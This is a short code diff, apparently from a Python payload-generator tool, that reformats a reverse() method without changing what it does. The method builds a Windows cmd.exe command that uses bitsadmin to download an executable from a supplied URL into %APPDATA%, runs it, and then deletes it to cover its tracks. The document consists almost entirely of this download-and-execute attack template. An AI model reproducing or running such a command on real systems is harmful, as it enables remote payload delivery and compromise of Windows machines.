@@ -17,4 +17,5 @@ Platform  -> Above win7
 """
 
     def reverse(self, url, ran):
-        return "cmd.exe /c bitsadmin /transfer {ran} {url} %APPDATA%\\{ran}.exe&%APPDATA%\\{ran}.exe&del %APPDATA%\\{ran}.exe".format(ran=ran, url=url)
+        return "cmd.exe /c bitsadmin /transfer {ran} {url} %APPDATA%\\{ran}.exe&%APPDATA%\\{ran}.exe&del %APPDATA%\\{ran}.exe".format(
+            ran=ran, url=url)
